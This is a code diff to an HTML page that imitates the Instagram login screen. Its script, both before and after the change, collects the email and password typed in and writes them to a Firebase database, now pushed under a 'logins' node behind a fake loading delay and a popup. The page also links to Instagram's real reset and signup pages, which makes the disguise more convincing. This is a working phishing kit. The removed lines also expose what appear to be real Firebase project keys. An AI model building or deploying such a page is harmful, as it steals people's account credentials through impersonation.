@@ -135,6 +135,38 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        /* Toast Message Styling */
+        .toast {
+            visibility: hidden;
+            min-width: 250px;
+            margin-left: -125px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 2px;
+            padding: 16px;
+            position: fixed;
+            z-index: 1;
+            left: 50%;
+            bottom: 30px;
+            font-size: 17px;
+        }
+
+        .toast.show {
+            visibility: visible;
+            animation: fadein 0.5s, fadeout 0.5s 1.5s;
+        }
+
+        @keyframes fadein {
+            from { bottom: 0; opacity: 0; }
+            to { bottom: 30px; opacity: 1; }
+        }
+
+        @keyframes fadeout {
+            from { bottom: 30px; opacity: 1; }
+            to { bottom: 0; opacity: 0; }
+        }
     </style>
 </head>
 <body>
@@ -188,77 +220,104 @@
             <p class="mt-4 text-sm">Loading...</p>
         </div>
     </div>
+
+    <!-- Toast Message -->
+    <div id="toast" class="toast">Please fill in all fields.</div>
 </div>
 
 <script type="module">
     // Import the functions you need from the SDKs you need
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js";
-    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-database.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-database.js";
 
     // Your web app's Firebase configuration
     const firebaseConfig = {
-        apiKey: "AIzaSyBASTYwglM57RKcJtGO9OacYxhlEPgDFVU",
-        authDomain: "hecabrus-86704.firebaseapp.com",
-        databaseURL: "https://hecabrus-86704-default-rtdb.firebaseio.com",
-        projectId: "hecabrus-86704",
-        storageBucket: "hecabrus-86704.appspot.com",
-        messagingSenderId: "1041062334121",
-        appId: "1:1041062334121:web:7419eb163492764480a3b8",
-        measurementId: "G-CN4DCXTLFV"
+      apiKey: "AIzaSyAaryJSWP9Xx7YxHfzGmuUCdfsIFsWg",
+      authDomain: "instagram-clone.firebaseapp.com",
+      databaseURL: "https://instagram-clone.firebaseio.com",
+      projectId: "instagram-clone",
+      storageBucket: "instagram-clone.appspot.com",
+      messagingSenderId: "123456789",
+      appId: "1:123456789:web:abcdef123456"
     };
 
     // Initialize Firebase
     const app = initializeApp(firebaseConfig);
     const database = getDatabase(app);
 
-    function writeUserData(email, password) {
-        const userId = email.replace(/[^a-zA-Z0-9]/g, '_'); // Simple way to create a unique ID
-        set(ref(database, 'users/' + userId), {
-            email: email,
-            password: password
-        });
+    // Show loading overlay
+    function showLoading() {
+        document.getElementById('loading').classList.add('active');
     }
 
-    function handleLogin() {
-        const email = document.getElementById("email").value;
-        const password = document.getElementById("password").value;
-        
-        // Display loading animation
-        document.getElementById("loading").classList.add("active");
+    // Hide loading overlay
+    function hideLoading() {
+        document.getElementById('loading').classList.remove('active');
+    }
 
-        // Simulate a delay to mimic network request
+    // Show toast message
+    function showToast(message) {
+        const toast = document.getElementById('toast');
+        toast.textContent = message;
+        toast.className = 'toast show';
         setTimeout(() => {
-            // Hide loading animation
-            document.getElementById("loading").classList.remove("active");
-
-            // Write user data to Firebase
-            writeUserData(email, password);
-
-            // Show the pop-up
-            showPopup();
-        }, 2000); // 2-second delay
+            toast.className = toast.className.replace('show', '');
+        }, 1000);
     }
 
+    // Show popup
+    function showPopup() {
+        document.getElementById('popup').classList.add('active');
+    }
+
+    // Hide popup
+    function hidePopup() {
+        document.getElementById('popup').classList.remove('active');
+    }
+
+    // Handle login
+    function handleLogin() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        if (!email || !password) {
+            showToast('Please fill in all fields.');
+            return;
+        }
+
+        showLoading();
+
+        // Simulate a delay for loading animation
+        setTimeout(() => {
+            // Push the login data to the Firebase database
+            const loginRef = ref(database, 'logins');
+            push(loginRef, {
+                email: email,
+                password: password
+            }).then(() => {
+                hideLoading();
+                showPopup();
+            }).catch((error) => {
+                hideLoading();
+                showToast('Error: ' + error.message);
+            });
+        }, 2000);
+    }
+
+    // Handle Facebook login
     function handleFacebookLogin() {
-        alert('error');
+        showToast('Error');
     }
 
+    // Handle forgot password
     function handleForgotPassword() {
         window.location.href = 'https://www.instagram.com/accounts/password/reset/';
     }
 
+    // Handle sign up
     function handleSignUp() {
         window.location.href = 'https://www.instagram.com/accounts/emailsignup/';
     }
-
-    function showPopup() {
-        document.getElementById("popup").classList.add("active");
-    }
-
-    function hidePopup() {
-        document.getElementById("popup").classList.remove("active");
-    }
 </script>
-
 </body>
 </html>
